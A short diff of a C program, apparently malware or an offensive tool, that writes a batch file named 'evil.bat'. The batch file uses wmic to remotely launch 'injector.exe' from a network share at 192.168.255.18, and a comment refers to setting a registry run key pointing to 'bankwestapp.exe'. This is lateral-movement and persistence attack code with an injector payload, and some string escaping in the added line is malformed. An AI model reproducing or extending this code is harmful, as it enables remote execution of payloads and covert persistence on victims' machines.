@@ -12,7 +12,7 @@ int main()
 {
 	const char* dirpath = "c:\\Users\\saurav\\Temp";
 	const char* filename = "c:\\Users\\saurav\\Temp\\evil.bat";
-    const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'C:\\Users\\saurav\\Desktop\\injector.exe\' /nointeractive";
+    const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\192.168.255.18\c$\Users\saurav\Desktop\injector.exe' /nointeractive";
 
 
 //Create Directory
@@ -37,7 +37,7 @@ int main()
     CloseHandle(hfile);
 
 //Create computer.txt content
-	system("echo SauravWindowsVi > c:\\Users\\saurav\\Temp\\computer.txt");
+	system("echo 192.168.255.18 > c:\\Users\\saurav\\Temp\\computer.txt");
     
 //Set registry runkey Value - point to bankwestapp.exe
 
